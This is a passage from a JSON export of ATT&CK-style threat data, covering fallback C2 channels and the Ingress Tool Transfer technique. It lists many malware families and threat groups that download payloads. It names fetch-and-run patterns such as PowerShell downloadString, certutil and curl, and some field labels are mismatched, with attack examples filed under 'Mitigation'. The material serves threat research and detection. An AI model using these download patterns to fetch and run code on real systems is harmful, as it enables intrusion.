        "description": "Uroburos can use up to 10 channels to communicate between implants.[49]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak can communicate over multiple C2 hosts.[50]"
      },
      {
        "id": "S0059",
        "name": "WinMM",
        "description": "WinMM is usually configured with primary and backup domains for C2 communications.[45]"
      },
      {
        "id": "S0117",
        "name": "XTunnel",
        "description": "The C2 server used by XTunnel provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.[11]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds. Processes utilizing the network that do not normally have network communication or have never been seen before may be suspicious.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on TCP network connection creation. The below analytic is using an event ID from OSQuery. Analytic 1 - Windows Process Network Connection netcon_from_sysproc = filter process_open_sockets where remote_port != 0 AND proc_name!= '';\""
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows, such as unexpected surges or other abnormal inbound/outbound patterns."
      }
    ],
    "Subtechniques": "\nCommand and Control"
  },
  {
    "Title": "Ingress Tool Transfer",
    "Code": "T1105",
    "Description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). On Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.[1]Adversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.Files can also be transferred using various Web Services as well as native or otherwise present tools on the victim system.[2] In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.[3]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. [4]"
      },
      {
        "id": "S0469",
        "name": "ABK",
        "description": "ABK has the ability to download files from C2.[5]"
      },
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT has the ability to download additional payloads onto an infected machine.[6]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can download additional files for execution on the victim’s machine.[7][8]"
      },
      {
        "id": "S0092",
        "name": "Agent.btz",
        "description": "Agent.btz attempts to download an encrypted binary from a specified domain.[9]"
      },
      {
        "id": "G0130",
        "name": "Ajax Security Team",
        "description": "Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.[10]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey can download and execute files to further infect a host machine with additional malware.[11]"
      },
      {
        "id": "S0504",
        "name": "Anchor",
        "description": "Anchor can download additional payloads.[12][13]"
      },
      {
        "id": "G0138",
        "name": "Andariel",
        "description": "Andariel has downloaded additional tools and malware onto compromised hosts.[14]"
      },
      {
        "id": "S1074",
        "name": "ANDROMEDA",
        "description": "ANDROMEDA can download additional payloads from C2.[15]"
      },
      {
        "id": "G0099",
        "name": "APT-C-36",
        "description": "APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened.[16]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 can upload a file to the victim’s machine.[17]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.[18][19][20][21][22]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has downloaded additional tools and malware onto compromised networks.[23][24][25][26]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that can copy files to remote machines.[27]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.[28]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has downloaded additional files and programs from its C2 server.[29][30]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has downloaded second stage malware from compromised websites.[31][32][33][34]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine.[35]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has downloaded tools to compromised hosts.[36][37]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used certutil to download additional files.[38][39][40]"
      },
      {
        "id": "G0143",
        "name": "Aquatic Panda",
        "description": "Aquatic Panda has downloaded additional malware onto compromised hosts.[41]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to download additional payloads from C2.[42]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth uses certutil and BITSAdmin to download additional malware. [43][44][45]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT has the ability to download files over SFTP.[46]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor can download additional plugins, updates and other files. [47]"
      },
      {
        "id": "S0347",
        "name": "AuditCred",
        "description": "AuditCred can download files and additional malware.[48]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to download files from C2 to a compromised host.[5]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can download and execute additional files. Azorult has also downloaded a ransomware payload called Hermes.[49][50]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has downloaded additional files from the C2.[51][52]"
      },
      {
        "id": "S0475",
        "name": "BackConfig",
        "description": "BackConfig can download and execute additional payloads on a compromised host.[53]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea can download additional modules from C2.[54]"
      },
      {
        "id": "G0135",
        "name": "BackdoorDiplomacy",
        "description": "BackdoorDiplomacy has downloaded additional files and tools onto a compromised host.[55]"
      },
      {
        "id": "S0642",
        "name": "BADFLICK",
        "description": "BADFLICK has download files from its C2 server.[56]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH has the ability to load a second stage malicious DLL file onto a compromised machine.[57]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "BADNEWS is capable of downloading additional files through C2 channels, including a new version of itself.[58][59][60]"
      },
      {
        "id": "S0337",
        "name": "BadPatch",
        "description": "BadPatch can download and execute or update malware.[61]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook can download files to the system.[62]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot uploads files and secondary payloads to the victim's machine.[63]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as Cobalt Strike.[64][65][66][67]"
      },
      {
        "id": "S0470",
        "name": "BBK",
        "description": "BBK has the ability to download files from C2 to the infected host.[5]"
      },
      {
        "id": "S0574",
        "name": "BendyBear",
        "description": "BendyBear is designed to download an implant from a C2 server.[68]"
      },
      {
        "id": "S0017",
        "name": "BISCUIT",
        "description": "BISCUIT has a command to download a file from the C2 server.[69]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has the capability to download files to execute on the victim’s machine.[70][71][72]"
      },
      {
        "id": "S0190",
        "name": "BITSAdmin",
        "description": "BITSAdmin can be used to create BITS Jobs to upload and/or download files.[73]"
      },
      {
        "id": "G1002",
        "name": "BITTER",
        "description": "BITTER has downloaded additional malware and tools onto a compromised host.[74][75]"
      },
      {
        "id": "S0564",
        "name": "BlackMould",
        "description": "BlackMould has the ability to download files to the victim's machine.[76]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has downloaded files to a victim machine.[77]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can download additional files onto the host.[33]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan can download additional modules from the C2 server.[78]"
      },
      {
        "id": "S0360",
        "name": "BONDUPDATER",
        "description": "BONDUPDATER can download or upload files from its C2 server.[79]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox has the ability to download next stage malware components to a compromised system.[80]"
      },
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon can download files.[81]"
      },
      {
        "id": "S0204",
        "name": "Briba",
        "description": "Briba downloads files onto infected hosts.[82]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget).[83]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can download files to compromised hosts.[84]"
      },
      {
        "id": "S0471",
        "name": "build_downer",
        "description": "build_downer has the ability to download files from C2 to the infected host.[5]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can download and execute additional payloads including through the use of a Dex command.[85][86][87]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore can download and execute new versions of itself.[88]"
      },
      {
        "id": "C0010",
        "name": "C0010",
        "description": "During C0010, UNC3890 actors downloaded tools and malware onto a compromised host.[89]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors downloaded additional tools and files onto a compromised network.[90]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 downloaded malicious payloads onto compromised systems.[91]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors downloaded additional tools, such as Mimikatz and Sliver, as well as Cobalt Strike and AvosLocker ransomware onto the victim network.[92][93]"
      },
      {
        "id": "C0021",
        "name": "C0021",
        "description": "During C0021, the threat actors downloaded additional tools and files onto victim machines.[94][95]"
      },
      {
        "id": "C0026",
        "name": "C0026",
        "description": "During C0026, the threat actors downloaded malicious payloads onto select compromised hosts.[15]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider downloaded tools using victim organization systems.[96]"
      },
      {
        "id": "S0274",
        "name": "Calisto",
        "description": "Calisto has the capability to upload and download files to the victim's machine.[97]"
      },
      {
        "id": "S0077",
        "name": "CallMe",
        "description": "CallMe has the capability to download a file to the victim from the C2 server.[98]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon can download a payload for execution.[99]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp can download and execute new plugins from the C2 server. [100][101]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT can download and execute additional payloads.[102]"
      },
      {
        "id": "S0465",
        "name": "CARROTBALL",
        "description": "CARROTBALL has the ability to download and install a remote payload.[103]"
      },
      {
        "id": "S0462",
        "name": "CARROTBAT",
        "description": "CARROTBAT has the ability to download and execute a remote file via certutil.[104]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell has a module to download and upload files to the system.[105]"
      },
      {
        "id": "S0160",
        "name": "certutil",
        "description": "certutil can be used to download files from a given URL.[106][107]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes can download additional files onto an infected machine.[108]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower has the ability to download additional modules to a compromised host.[109]"
      },
      {
        "id": "S0144",
        "name": "ChChes",
        "description": "ChChes is capable of downloading files, including additional modules.[110][111][112]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has remotely copied tools and malware onto targeted systems.[113]"
      },
      {
        "id": "S0020",
        "name": "China Chopper",
        "description": "China Chopper's server component can download remote files.[114][115][116][117]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK is capable of performing remote file transmission.[118]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can download its code from C2.[119]"
      },
      {
        "id": "S0054",
        "name": "CloudDuke",
        "description": "CloudDuke downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.[25]"
      },
      {
        "id": "S0106",
        "name": "cmd",
        "description": "cmd can be used to copy files to/from a remotely connected external system.[120]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.[121][2] The group's JavaScript backdoor is also capable of downloading files.[122]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can deliver additional payloads to victim machines.[123][124]"
      },
      {
        "id": "S0369",
        "name": "CoinTicker",
        "description": "CoinTicker executes a Python script to download its second stage.[125]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker downloads an HTTP server to the infected machine.[126]"
      },
      {
        "id": "G0142",
        "name": "Confucius",
        "description": "Confucius has downloaded additional files and payloads onto a compromised host following initial access.[127][128]"
      },
      {
        "id": "S0492",
        "name": "CookieMiner",
        "description": "CookieMiner can download additional scripts from a web server.[129]"
      },
      {
        "id": "S0137",
        "name": "CORESHELL",
        "description": "CORESHELL downloads another dropper from its C2 server.[130]"
      },
      {
        "id": "S0614",
        "name": "CostaBricks",
        "description": "CostaBricks has been used to load SombRAT onto a compromised host.[131]"
      },
      {
        "id": "C0004",
        "name": "CostaRicto",
        "description": "During CostaRicto, the threat actors downloaded malware and tools onto a compromised host.[131]"
      },
      {
        "id": "S1023",
        "name": "CreepyDrive",
        "description": "CreepyDrive can download files to the compromised host.[132]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson contains a command to retrieve files from its C2 server.[133][134][135]"
      },
      {
        "id": "S0498",
        "name": "Cryptoistic",
        "description": "Cryptoistic has the ability to send and receive files.[136]"
      },
      {
        "id": "S0527",
        "name": "CSPY Downloader",
        "description": "CSPY Downloader can download additional tools to a compromised host.[137]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can download files from its C2 server.[138]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink has the ability to download files to target systems.[139][140]"
      },
      {
        "id": "S0497",
        "name": "Dacls",
        "description": "Dacls can download its payload from a C2 server.[136][141]"
      },
      {
        "id": "S1014",
        "name": "DanBot",
        "description": "DanBot can download additional files to a targeted system.[142]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet can load any files onto the infected machine to execute.[143][144]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel has used first-stage payloads that download additional malware from C2 servers.[145]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can download additional packages for keylogging, cryptocurrency mining, and other capabilities; it can also retrieve malicious payloads such as Agent Tesla, AsyncRat, NanoCore, RedLine, Cobalt Strike, and Metasploit.[146]"
      },
      {
        "id": "S0187",
        "name": "Daserf",
        "description": "Daserf can download remote files.[147][83]"
      },
      {
        "id": "S0255",
        "name": "DDKONG",
        "description": "DDKONG downloads and uploads files on the victim’s machine.[148]"
      },
      {
        "id": "S0616",
        "name": "DEATHRANSOM",
        "description": "DEATHRANSOM can download files to a compromised host.[149]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis deploys additional backdoors and hacking tools to the system.[150]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol can receive configuration updates and additional payloads including wscpy.exe from C2.[151]"
      },
      {
        "id": "S0200",
        "name": "Dipsind",
        "description": "Dipsind can download remote files.[152]"
      },
      {
        "id": "S1088",
        "name": "Disco",
        "description": "Disco can download files to targeted systems via SMB.[153]"
      },
      {
        "id": "S1021",
        "name": "DnsSystem",
        "description": "DnsSystem can download files to compromised systems after receiving a command with the string downloaddd.[154]"
      },
      {
        "id": "S0213",
        "name": "DOGCALL",
        "description": "DOGCALL can download and execute additional payloads.[155]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki has downloaded scripts from C2.[156]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut can download and execute previously staged shellcode payloads.[157]"
      },
      {
        "id": "S0472",
        "name": "down_new",
        "description": "down_new has the ability to download files to the compromised host.[5]"
      },
      {
        "id": "S0134",
        "name": "Downdelph",
        "description": "After downloading its main config file, Downdelph downloads multiple payloads from C2 servers.[158]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has copied and installed tools for operations once in the victim environment.[159]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can deploy additional tools onto an infected machine.[160]"
      },
      {
        "id": "S0547",
        "name": "DropBook",
        "description": "DropBook can download and execute additional files.[161][162]"
      },
      {
        "id": "S0502",
        "name": "Drovorub",
        "description": "Drovorub can download files to a compromised host.[163]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack’s can download and upload a file to the victim’s computer.[164][165]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has a command to download and executes additional files.[166]"
      },
      {
        "id": "S0624",
        "name": "Ecipekac",
        "description": "Ecipekac can download additional payloads to a compromised host.[167]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor has the ability to download files from its C2 server.[168][169]"
      },
      {
        "id": "G0066",
        "name": "Elderwood",
        "description": "The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location.[170]"
      },
      {
        "id": "S0081",
        "name": "Elise",
        "description": "Elise can download additional files from the C2 server for execution.[171]"
      },
      {
        "id": "G1003",
        "name": "Ember Bear",
        "description": "Ember Bear has used tools to download malicious code.[172]"
      },
      {
        "id": "S0082",
        "name": "Emissary",
        "description": "Emissary has the capability to download files from the C2 server.[173]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can upload and download to and from a victim machine.[174]"
      },
      {
        "id": "S0404",
        "name": "esentutl",
        "description": "esentutl can be used to copy files from a given URL.[175]"
      },
      {
        "id": "S0396",
        "name": "EvilBunny",
        "description": "EvilBunny has downloaded additional Lua scripts from the C2.[176]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM can download and upload files to the victim's computer.[177][178]"
      },
      {
        "id": "G0120",
        "name": "Evilnum",
        "description": "Evilnum can deploy additional components or tools as needed.[177]"
      },
      {
        "id": "S0401",
        "name": "Exaramel for Linux",
        "description": "Exaramel for Linux has a command to download a file from  and to a remote C2 server.[179][180]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive has a function to download a file to the infected system.[181]"
      },
      {
        "id": "S0171",
        "name": "Felismus",
        "description": "Felismus can download files from remote servers.[182]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT downloads and uploads files to and from the victim’s machine.[183][184]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has downloaded additional tools and malware to compromised systems.[185][186]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.[187][188][189]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used remote code execution to download subsequent payloads.[190][191]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro can download additional malware from the C2 server.[192]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy can transfer files from C2.[193]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.[194]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has downloaded additional tools including PsExec directly to endpoints.[195]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors downloaded files and tools onto a victim machine.[196]"
      },
      {
        "id": "S0095",
        "name": "ftp",
        "description": "ftp may be abused by adversaries to transfer tools or files from an external system into a compromised environment.[197][198]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can download additional files onto a compromised host.[199]"
      },
      {
        "id": "C0007",
        "name": "FunnyDream",
        "description": "During FunnyDream, the threat actors downloaded additional droppers and backdoors onto a compromised system.[199]"
      },
      {
        "id": "S0628",
        "name": "FYAnti",
        "description": "FYAnti can download additional payloads to a compromised host.[167]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.[200][76]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has downloaded additional malware and tools onto a compromised host.[201][202][203][204]"
      },
      {
        "id": "S0168",
        "name": "Gazer",
        "description": "Gazer can execute a task to download a file.[205][206]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can download additional plug-ins to a compromised host.[119]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT can download files to the victim’s machine.[207][208]"
      },
      {
        "id": "S0249",
        "name": "Gold Dragon",
        "description": "Gold Dragon can download additional components from the C2 server.[209]"
      },
      {
        "id": "S0493",
        "name": "GoldenSpy",
        "description": "GoldenSpy constantly attempts to download and execute files from the remote C2, including GoldenSpy itself if not found on the system.[210]"
      },
      {
        "id": "S0588",
        "name": "GoldMax",
        "description": "GoldMax can download and execute additional files.[211][212]"
      },
      {
        "id": "G0078",
        "name": "Gorgon Group",
        "description": "Gorgon Group malware can download additional files from C2 servers.[213]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can download its second stage from a hardcoded URL within the loader's code.[214][215]"
      },
      {
        "id": "S0342",
        "name": "GreyEnergy",
        "description": "GreyEnergy can download additional modules and payloads.[184]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent has the ability to download and execute additional payloads.[216]"
      },
      {
        "id": "S0561",
        "name": "GuLoader",
        "description": "GuLoader can download further malware for execution on the victim's machine.[217]"
      },
      {
        "id": "S0132",
        "name": "H1N1",
        "description": "H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.[218]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.[219][117]"
      },
      {
        "id": "S0499",
        "name": "Hancitor",
        "description": "Hancitor has the ability to download additional files from C2.[220]"
      },
      {
        "id": "S0214",
        "name": "HAPPYWORK",
        "description": "can download and execute a second-stage payload.[31]"
      },
      {
        "id": "S0170",
        "name": "Helminth",
        "description": "Helminth can download additional files.[221]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has downloaded additional payloads and malicious scripts onto a compromised host.[222]"
      },
      {
        "id": "S0087",
        "name": "Hi-Zor",
        "description": "Hi-Zor has the ability to upload and download files from its C2 server.[223]"
      },
      {
        "id": "S0394",
        "name": "HiddenWasp",
        "description": "HiddenWasp downloads a tar compressed archive from a download server to the system.[224]"
      },
      {
        "id": "S0009",
        "name": "Hikit",
        "description": "Hikit has the ability to download files to a compromised host.[225]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has downloaded additional scripts that build and run Monero cryptocurrency miners.[226]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has the ability to connect to a remote host in order to upload and download files.[227]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to upload a file from the command and control (C2) server to the victim machine.[228]"
      },
      {
        "id": "S0070",
        "name": "HTTPBrowser",
        "description": "HTTPBrowser is capable of writing a file to the compromised system from the C2 server.[229]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can download files and additional malware components.[230][231]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro has the ability to download additional files.[232]"
      },
      {
        "id": "S0483",
        "name": "IcedID",
        "description": "IcedID has the ability to download additional modules and a configuration file from C2.[233][234]"
      },
      {
        "id": "G0136",
        "name": "IndigoZebra",
        "description": "IndigoZebra has downloaded additional files and tools from its C2 server.[81]"
      },
      {
        "id": "G0119",
        "name": "Indrik Spider",
        "description": "Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host.[235][236]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer downloads a shellcode payload from a remote C2 server and loads it into memory.[237]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can upload files to the victim's machine for operations.[238][239]"
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe can download and execute additional files.[240]"
      },
      {
        "id": "S0528",
        "name": "Javali",
        "description": "Javali can download payloads from remote C2 servers.[45]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "JHUHUGIT can retrieve an additional payload from its C2 server.[241][242] JHUHUGIT has a command to download files to the victim’s machine.[243]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can download files and upgrade itself.[152]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can download and execute files.[244][245][246]"
      },
      {
        "id": "S0648",
        "name": "JSS Loader",
        "description": "JSS Loader has the ability to download malicious executables to a compromised host.[247]"
      },
      {
        "id": "S0215",
        "name": "KARAE",
        "description": "KARAE can upload and download files, including second-stage malware.[31]"
      },
      {
        "id": "S0088",
        "name": "Kasidet",
        "description": "Kasidet has the ability to download and execute additional files.[248]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.[249]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used tools to download files to compromised machines.[250]"
      },
      {
        "id": "S0585",
        "name": "Kerrdown",
        "description": "Kerrdown can download specific payloads to a compromised host based on OS architecture.[251]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel can download additional modules from the C2 server.[78]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can download files to the compromised host.[222]"
      },
      {
        "id": "S0387",
        "name": "KeyBoy",
        "description": "KeyBoy has a download and upload functionality.[252][253]"
      },
      {
        "id": "S0271",
        "name": "KEYMARBLE",
        "description": "KEYMARBLE can upload files to the victim’s machine and can download additional payloads.[254]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY has the ability to download and execute code from remote servers.[137]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has downloaded additional scripts, tools, and malware onto victim systems.[39][255]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has downloaded additional lateral movement scripts from C2.[256]"
      },
      {
        "id": "S0437",
        "name": "Kivars",
        "description": "Kivars has the ability to download and execute files.[257]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can download additional files and tools.[258][259]"
      },
      {
        "id": "S0669",
        "name": "KOCTOPUS",
        "description": "KOCTOPUS has executed a PowerShell command to download a file to the system.[259]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI can download files and execute them on the victim’s machine.[260][261]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs downloads additional files from C2 servers.[262]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host.[263][264][265][136][141][266][267][268][269][270]"
      },
      {
        "id": "G0140",
        "name": "LazyScripter",
        "description": "LazyScripter had downloaded additional tools to a compromised host.[259]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has downloaded additional scripts and files from adversary-controlled servers.[271][114]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron has the ability to download and execute additional files.[272]"
      },
      {
        "id": "S0211",
        "name": "Linfo",
        "description": "Linfo creates a backdoor through which remote attackers can download files onto compromised hosts.[273]"
      },
      {
        "id": "S0513",
        "name": "LiteDuke",
        "description": "LiteDuke has the ability to download files.[274]"
      },
      {
        "id": "S0680",
        "name": "LitePower",
        "description": "LitePower has the ability to download payloads containing system commands to a compromised host.[275]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can download additional plugins, files, and tools.[276]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot downloaded several staged items onto the victim's machine.[277]"
      },
      {
        "id": "S0451",
        "name": "LoudMiner",
        "description": "LoudMiner used SCP to update the miner from the C2.[278]"
      },
      {
        "id": "S0042",
        "name": "LOWBALL",
        "description": "LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.[279]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can download and execute a replica of itself using certutil.[280]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has downloaded additional malware and tools onto a compromised host.[281][282]"
      },
      {
        "id": "S0409",
        "name": "Machete",
